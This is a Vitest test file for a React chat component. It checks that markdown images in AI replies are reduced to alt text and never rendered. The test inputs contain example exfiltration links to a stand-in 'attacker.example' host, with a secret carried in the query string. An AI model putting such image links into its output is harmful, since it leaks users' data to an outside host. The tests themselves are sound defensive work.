import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import AIChatMessage from "./AIChatMessage";

describe("AIChatMessage markdown images", () => {
  it("renders alt text and never an <img> for markdown images", () => {
    const html = renderToStaticMarkup(
      <AIChatMessage text={"Here ![chart of results](https://attacker.example/x.png?q=secret) done"} />,
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("chart of results");
  });

  it("drops images that have no alt text", () => {
    const html = renderToStaticMarkup(
      <AIChatMessage text={"Before ![](https://attacker.example/x.png) after"} />,
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
  });
});
